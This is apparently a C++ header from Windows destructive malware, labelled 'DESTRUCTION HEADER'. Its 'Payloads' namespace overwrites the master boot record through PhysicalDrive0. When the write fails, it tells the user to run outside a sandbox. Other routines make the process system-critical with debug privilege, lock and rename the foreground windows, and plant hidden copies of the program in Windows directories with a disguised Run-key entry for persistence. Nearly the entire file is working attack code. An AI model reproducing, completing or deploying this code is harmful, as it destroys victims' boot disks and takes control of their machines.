#pragma comment(lib, "ADVAPI32")
#pragma comment(lib, "USER32")

/** DESTRUCTION HEADER **/


#include "FUNCTION.h"
#include "BUFFER.h"

/* WARNING:
RECYCLED CODE FROM DINGALING.EXE */
typedef void(_stdcall* RTLPROCESSCRITICAL) (IN BYTE NewValue, OUT PBYTE OldValue, IN BYTE IsWinlogon);

WINBOOL EnablePrivs(LPCWSTR lpprivs) {
	HANDLE htk;
	LUID luid;
	TOKEN_PRIVILEGES token;
	RtlZeroMemory(&token, sizeof(token));
	
	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY), &htk)) return false;
	if (!LookupPrivilegeValueW(NULL, lpprivs, &luid)) {
		CloseHandle(htk);
		return false;
	}
	
	token.PrivilegeCount = 1;
	token.Privileges[0].Luid = luid;
	token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
	BOOL bret = AdjustTokenPrivileges(htk, false, &token, sizeof(token), NULL, NULL);
	CloseHandle(htk);
	return bret;
}




namespace Payloads {
	VOID OverwriteBoot(VOID) {
		DWORD i;
		HANDLE hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		BOOL statement = WriteFile(hFile, cbRawData, 32768, &i, NULL);
		if (!statement) {
			MessageBoxW(NULL, L"An error occurred while overwriting the MBR.\n\nThe MBR could not be overwritten.\nThis is because of active sandboxes running, like Sandboxie Plus.\nRun it unsandboxed, and then continue.",
			L"Error",
			MB_ICONERROR);
			CloseHandle(hFile);
			exit(0);
		}
		CloseHandle(hFile);
	}
	
	WINBOOL SetCurrentCriticalProcess(VOID) {
		HANDLE hlib;
		RTLPROCESSCRITICAL SetCritiProcess;
		
		hlib = LoadLibraryW(L"ntdll.dll");
		if (hlib != NULL) {
			EnablePrivs(L"SeDebugPrivilege");
			SetCritiProcess = (RTLPROCESSCRITICAL)GetProcAddress((HMODULE)hlib, "RtlSetProcessIsCritical");
			if (!SetCritiProcess) return 0;
			SetCritiProcess(1, 0, 0);
			return 1;
		}
		else return 0;
	}
	
	DWORD WINAPI HookAndRenameWindows(LPVOID lpVoid) {
		while (TRUE) {
			HWND hwnd = GetForegroundWindow(); // All active windows
			HMENU hMenu = GetSystemMenu(hwnd, FALSE);
			EnableMenuItem(hMenu, SC_CLOSE, MF_BYCOMMAND | MF_GRAYED | MF_DISABLED);
			SetWindowLongW(hwnd, GWL_STYLE, GetWindowLongW(hwnd, GWL_STYLE) &~ WS_MAXIMIZEBOX); // NAND
			SetWindowLongW(hwnd, GWL_STYLE, GetWindowLongW(hwnd, GWL_STYLE) &~ WS_MINIMIZEBOX);
			SetWindowTextW(hwnd, L"NULL");
			Sleep(5);
		}
	}
	
	VOID CopyMalwareToSystem(VOID) {
		LPCWSTR lpcwDirectories[] = {
			L"C:\\WINDOWS\\0x01.exe",
			L"C:\\WINDOWS\\System32\\decompile.exe",
			L"C:\\NULL.ini"
		};
		for (INT i = 0; i < 3; i++) {
			System::ExtCopyFile(GetDirOEM(), lpcwDirectories[i], FILE_ATTRIBUTE_HIDDEN);
			System::RegistryW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", L"Printer Generator", REG_SZ, 0, lpcwDirectories[0], TRUE);
		}
	}
	
	INT j;
	VOID pMessageSpam(VOID) {
		j++;
	    if (j < 25) {
			CreateThread(NULL, 0, &System::Message, NULL, 0, 0);
			Sleep(100);
		}
	}
}
